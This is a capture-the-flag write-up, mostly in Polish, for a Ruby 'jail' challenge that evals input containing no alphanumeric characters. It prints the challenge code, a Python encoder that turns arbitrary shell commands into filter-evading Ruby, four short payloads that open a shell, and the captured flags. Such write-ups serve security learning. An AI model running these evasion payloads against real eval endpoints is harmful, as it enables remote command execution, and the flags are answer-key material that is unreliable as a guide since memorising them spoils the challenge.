## HardToSay (misc, 200p, ?? solves)

    Ruby on Fails.
    FLAG1: nc 54.199.215.185 9001
    FLAG2: nc 54.199.215.185 9002
    FLAG3: nc 54.199.215.185 9003
    FLAG4: nc 54.199.215.185 9004

    hard_to_say-151ba63da9ef7f11bcbba93657805f85.rb

### PL
[ENG](#eng-version)

Dostajemy taki kod:

```ruby

#!/usr/bin/env ruby

fail 'flag?' unless File.file?('flag')

$stdout.sync = true

limit = ARGV[0].to_i
puts "Hi, I can say #{limit} bytes :P"
s = $stdin.gets.strip!

if s.size > limit || s[/[[:alnum:]]/]
  puts 'oh... I cannot say this, maybe it is too long or too weird :('
  exit
end

puts "I think size = #{s.size} is ok to me."
r = eval(s).to_s
r[64..-1] = '...' if r.size > 64
puts r
```

Jak widać pobiera on od użytkownika kod, i evaluje go - ale tylko pod warunkiem że nie zawiera znaków alfanumerycznych i jest odpowiednio krótki.

Są cztery serwery z zadaniem - każdy z nich przyjmuje mniej znaków. Pierwszy 1024, drugi 64, trzeci 36, a czwarty tylko 10. Za pokonanie każdego dostajemy 50 punktów.

Najlepszym rozwiązaniem na jakie wpadliśmy na początku to wykonanie operacji na shellu za pomocą backticków (``` ` ```) i interpolowania stringów.
Napisaliśmy sobie prosty enkoder wykonujący dowolne (odpowiednio krótkie) polecenie shellowe:

```python
def encode(cmd):
    out = """a1 = $$/$$
    a2 = a1+a1
    a4 = a2+a2
    a8 = a4+a4
    a16 = a8+a8
    a32 = a16+a16
    a64 = a32+a32
    """

    ss = []
    for c in cmd:
        cc = ord(c)
        vs = []
        for b in range(8):
            if (2**b) & ord(c):
                vs.append('a'+str(2**b))
        ss.append('(' + '+'.join(vs) + ")")
    s = '(""<<' + '<<'.join(ss) + ")"

    end = "`#{" + s + "}`"

    start = out + end

    varnames = ['_'*i for i in range(1,10)][::-1]

    start = start.replace('a64', varnames.pop())
    start = start.replace('a32', varnames.pop())
    start = start.replace('a16', varnames.pop())
    start = start.replace('a8', varnames.pop())
    start = start.replace('a4', varnames.pop())
    start = start.replace('a2', varnames.pop())
    start = start.replace('a1', varnames.pop())
    start = ';'.join(start.split('\n'))
    return start

import sys
print encode(sys.argv[1])
```

Flaga: `hitcon{what does the ruby say? @#$%!@&(%!#$&(%!@#$!$?...}`

+50 punktów. Zdobyliśmy w ten sposób pierwszą flagę. Niestety, okazało się że nie da się ukraść jednej flagi mając shella od drugiej flagi (brak uprawnień) i musieliśmy
kombinować dalej...

Postanowiliśmy złożyć string "sh". Nasza druga próba, dla 64 znaków, wyglądała tak:

    _=$$;$_=*?`..?{;`#{$_[_*_+_-_/_]+$_[_+_]}`

Flaga: `hitcon{Ruby in Peace m(_ _)m`

+50 punktów. A następnie dla 36 bajtów:

    _=*?[..?{;`#{_[~--$$-$$]+_[~$$*$$]}`

Flaga: `hitcon{My cats also know how to code in ruby :cat:}`

+50 punktów. Później myśleliśmy dłuższą chwilę, ale wpadliśmy na to, że wykonanie $0 również powinno dać nam shell - spróbowaliśmy więc:

    `$#{~-$.}`

Flaga: `hitcon{It's hard to say where ruby went wrong QwO}`

W ten sposób zdobyliśmy kolejne 50 punktów, rozwiązując w ten sposób całe zadanie.

### ENG version

